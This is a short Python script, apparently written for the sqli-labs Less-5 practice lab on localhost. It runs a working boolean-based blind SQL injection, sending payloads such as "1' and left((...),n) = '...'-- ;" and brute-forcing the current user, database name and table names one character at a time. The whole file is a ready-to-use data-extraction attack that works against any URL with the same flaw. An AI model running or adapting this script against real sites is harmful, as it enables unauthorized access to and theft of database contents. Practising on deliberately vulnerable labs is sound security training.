import requests
from Crypto.Util import number
import time

URL = "http://localhost/sqli-labs/Less-5/?id="

sql_payload1 = "SELECT database()";

sql_payload2 = "SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'"


def explode(sqlPayload, num, data):  # payload 第几位 已经爆破出来的字节
    payload = "1' and left(({sqlPayload}),{num}) = '{data}{char}'-- ;";
    for i in range(32, 127):
        payloadTmp = payload.format(sqlPayload=sqlPayload, num=num, data=data, char=chr(i));
        r = requests.get(URL + payloadTmp)
        if ("You are in" in r.text):  # 查到了东西
            return chr(i)


data = ''

payloadNow = "user()"

for i in range(1, 100):
    data += explode(payloadNow, i, data)
    print(data)
